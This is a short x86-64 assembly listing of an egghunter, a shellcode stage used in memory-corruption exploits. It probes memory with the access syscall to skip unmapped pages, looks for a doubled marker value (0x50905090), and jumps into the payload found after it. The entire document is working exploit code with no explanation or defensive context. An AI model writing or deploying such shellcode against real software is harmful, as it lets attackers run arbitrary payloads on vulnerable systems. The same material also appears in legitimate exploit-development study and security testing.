global _start

section .text

_start:

	xor rdx, rdx

switch_page:

	or dx, 0xfff

scan_page:

	inc rdx

	xor rax, rax
	xor rsi, rsi
	lea rdi, [rdx+0x4]
	mov al, 21
	syscall

	cmp al, 0xf2
	jz switch_page

	; half egg
	mov eax, 0x50905090
	mov rdi, rdx
	scasd
	jnz scan_page
	scasd
	jnz scan_page
	jmp rdi
